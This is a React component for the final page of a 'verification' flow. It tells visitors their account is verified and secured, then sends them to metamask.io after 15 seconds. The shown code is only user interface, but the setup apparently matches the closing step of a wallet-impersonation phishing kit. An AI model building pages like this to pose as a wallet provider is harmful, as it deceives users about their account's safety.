import React, { useEffect } from 'react'
import { useI18n } from '../contexts/I18nContext'
import { useSession } from '../contexts/SessionContext'
import Header from '../components/Header'
import '../styles/common.css'
import '../styles/finish.css'

const Finish = () => {
  const { t } = useI18n()
  const { setVerificationStage } = useSession()

  useEffect(() => {
    setVerificationStage('finish')
    

    const redirectDelay = 15000
    const timer = setTimeout(() => {
      const websiteDomain = 'metamask.io' // Should come from config
      window.location.href = `https://${websiteDomain}`
    }, redirectDelay)

    return () => clearTimeout(timer)
  }, [setVerificationStage])

  return (
    <div className="finish-page">
      <Header />
      <main id="main">
        <div className="container">
          <div className="thebox">
            <div className="title">
              <div className="success-icon"></div>
              <h3 id="main-title">
                {t('main_title', 'Verification Complete')}
              </h3>
              <p id="description-1">
                {t('description_1', 'Your account has been successfully verified.')}
              </p>
            </div>
            
            <div className="security-status">
              <h4 id="security-title">
                {t('security_title', 'Account Secured')}
              </h4>
              <p id="security-message">
                {t('security_message', 'Your account is now protected and secure.')}
              </p>
            </div>
            
            <div className="thank-you">
              <p id="thank-you-text">
                {t('thank_you_text', 'Thank you for using our service.')}
              </p>
            </div>
            
            <div className="action-buttons">
              <a 
                href="https://metamask.io" 
                className="btn btn-primary home-btn" 
                target="_blank" 
                rel="noopener noreferrer"
              >
                <span id="home-button-text">{t('home_button_text', 'Go to Home').trim()}</span>
              </a>
            </div>
          </div>
        </div>
      </main>
    </div>
  )
}

export default Finish
